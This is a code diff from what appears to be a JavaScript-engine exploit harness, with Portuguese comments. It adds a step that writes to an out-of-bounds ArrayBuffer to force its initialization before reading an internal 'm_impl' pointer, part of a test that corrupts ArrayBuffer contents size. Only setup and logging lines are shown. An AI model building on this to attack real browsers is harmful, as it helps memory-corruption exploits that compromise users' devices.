@@ -143,8 +143,25 @@ export async function executeCorruptArrayBufferContentsSizeTest() {
         return { errorOccurred: new Error("OOB Setup Failed"), stringifyResult: null, potentiallyCrashed: false };
     }
 
+    // **NOVA ETAPA: Forçar inicialização do oob_array_buffer_real**
+    logS3("Forçando inicialização completa do oob_array_buffer_real antes de ler m_impl...", "info", FNAME_TEST);
+    try {
+        if (oob_array_buffer_real.byteLength > 0) { // Só tentar se o buffer tem tamanho
+            const temp_dv = new DataView(oob_array_buffer_real);
+            temp_dv.setUint8(0, 0x01); // Escreve um byte no início do buffer de dados real
+            logS3("   Escrita de um byte no oob_array_buffer_real (via DataView) para forçar inicialização, realizada.", "good", FNAME_TEST);
+        } else {
+            logS3("   oob_array_buffer_real tem tamanho 0, pulando escrita de inicialização.", "warn", FNAME_TEST);
+        }
+    } catch (e_init) {
+        logS3(`   ERRO ao tentar forçar inicialização do oob_array_buffer_real: ${e_init.message}`, "error", FNAME_TEST);
+        // Não abortar, tentar ler o ponteiro mesmo assim.
+    }
+    await PAUSE_S3(SHORT_PAUSE_S3); // Pausa após a tentativa de inicialização
+
+
     const initial_oob_ab_real_byteLength = oob_array_buffer_real.byteLength;
-    logS3(`Tamanho inicial de oob_array_buffer_real: ${initial_oob_ab_real_byteLength} bytes`, "info", FNAME_TEST);
+    logS3(`Tamanho inicial de oob_array_buffer_real (após tentativa de init): ${initial_oob_ab_real_byteLength} bytes`, "info", FNAME_TEST);
 
     let contents_impl_ptr_val = null;
     let target_size_field_address_obj = null;
